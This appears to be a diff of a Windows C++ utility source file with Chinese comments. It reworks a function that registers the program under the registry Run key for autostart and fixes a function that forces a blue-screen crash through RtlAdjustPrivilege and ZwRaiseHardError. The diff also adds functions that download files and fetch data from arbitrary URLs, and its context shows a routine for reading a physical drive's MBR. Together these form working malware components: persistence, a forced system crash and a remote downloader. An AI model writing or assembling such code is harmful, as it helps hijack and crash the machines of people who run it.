@@ -84,7 +84,7 @@ string ReadPhydriveMBR(unsigned int id)
 
 
 //注册自启动
-void RegAutoStart()
+bool RegAutoStart(wstring name)
 {
 	HKEY hKey;
 	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
@@ -97,16 +97,20 @@ void RegAutoStart()
 		//3、判断注册表项是否已经存在
 		TCHAR strDir[MAX_PATH] = {};
 		DWORD nLength = MAX_PATH;
-		long result = RegGetValue(hKey, nullptr, _T("3daisoft"), RRF_RT_REG_SZ, 0, strDir, &nLength);
 		//4、已经存在
-		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
+		if (RegGetValue(hKey, nullptr, name.c_str(), RRF_RT_REG_SZ, 0, strDir, &nLength) != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
 		{
+			bool retn = false;
 			//5、添加一个子Key,并设置值
-			RegSetValueEx(hKey, _T("yhy3daigamestudio"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR));
+			retn=RegSetValueEx(hKey, name.c_str(), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR)) == ERROR_SUCCESS;
 			//6、关闭注册表
 			RegCloseKey(hKey);
+			return retn;
 		}
+		else
+			return true;
 	}
+	return false;
 }
 
 //蓝屏函数
@@ -123,13 +127,60 @@ bool MakeBlueScreen(unsigned int errid)
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
 		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(errid, 0, 0, 0, 6, &HDErr);
 		FreeLibrary(ntdll);
-		return false;
 	}
-
+	return false;
 }
 
 
 void PlaySoundFile(wstring soundname,bool sync)
 {
 	PlaySound(soundname.c_str(), NULL, SND_FILENAME | (sync? SND_SYNC :SND_ASYNC) | SND_LOOP);
+}
+
+bool DownloadFileFromURL(std::wstring url, std::wstring filepath)
+{
+	return ((URLDownloadToFile(NULL, url.c_str(), filepath.c_str(), 0, NULL)) == S_OK);
+}
+
+
+//从URL获取字符串
+std::wstring GetDataFromURL(std::wstring url, bool& iserr)
+{
+	CInternetSession session;
+	CHttpFile* file = NULL;
+	CString strURL = url.c_str();//URL
+	CString strHtml = _T("");	//存放网页数据
+	try
+	{
+		file = (CHttpFile*)session.OpenURL(strURL);
+	}
+	catch (CInternetException* m_pException)
+	{
+		file = NULL;
+		m_pException->m_dwError;
+		m_pException->Delete();
+		session.Close();
+		iserr = true;
+		return std::wstring();
+	}
+
+	CString strLine;
+
+	if (file != NULL)
+	{
+		while (file->ReadString(strLine) != NULL)
+		{
+			strHtml += strLine;
+		}
+	}
+	else
+	{
+		return std::wstring();
+	}
+	session.Close();
+	file->Close();
+	delete file;
+	file = NULL;
+	iserr = false;
+	return std::wstring(strHtml);
 }
